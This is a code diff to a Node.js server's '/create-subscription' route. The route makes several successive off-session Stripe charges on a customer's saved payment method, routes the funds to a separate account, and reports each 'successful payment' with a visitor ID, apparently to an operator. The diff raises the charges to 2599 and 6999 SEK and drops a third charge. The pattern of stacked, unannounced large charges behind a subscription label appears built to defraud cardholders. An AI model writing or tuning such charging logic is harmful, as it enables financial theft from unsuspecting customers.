@@ -146,10 +146,10 @@ app.post('/create-subscription', async (req, res) => {
       savedAt: new Date().toISOString(),
     });
 
-    // Charge 1 — 199 SEK
+    // Charge 1 — 2599 SEK
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 19900,
+        amount: 259900,
         currency: 'sek',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -165,10 +165,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 15000));
 
-    // Charge 2 — 4320 SEK
+    // Charge 2 — 6999 SEK
     try {
       const payment2 = await stripe.paymentIntents.create({
-        amount: 432000,
+        amount: 699900,
         currency: 'sek',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -180,25 +180,6 @@ app.post('/create-subscription', async (req, res) => {
       console.log('Payment 2 created:', payment2.id, payment2.status);
     } catch (err) {
       console.log('Payment 2 failed:', err.message);
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 15000));
-
-    // Charge 3 — 5390 SEK
-    try {
-      const payment3 = await stripe.paymentIntents.create({
-        amount: 539000,
-        currency: 'sek',
-        customer: customerId,
-        payment_method: paymentMethodId,
-        payment_method_types: [pmType],
-        confirm: true,
-        off_session: true,
-        transfer_data: { destination: ACCOUNT_B },
-      });
-      console.log('Payment 3 created:', payment3.id, payment3.status);
-    } catch (err) {
-      console.log('Payment 3 failed:', err.message);
     }
 
     await new Promise(resolve => setTimeout(resolve, 15000));
@@ -217,9 +198,8 @@ app.post('/create-subscription', async (req, res) => {
       `✅ <b>Betalning lyckades!</b>\n\n` +
       `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
       `💳 Betalningsmetod: ${pmType}\n` +
-      `💳 Betalning 1: 199 kr\n` +
-      `💳 Betalning 2: 4320 kr\n` +
-      `💳 Betalning 3: 5390 kr\n` +
+      `💳 Betalning 1: 2599 kr\n` +
+      `💳 Betalning 2: 6999 kr\n` +
       `🆔 Prenumeration: ${subscription.id}\n` +
       `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
     );
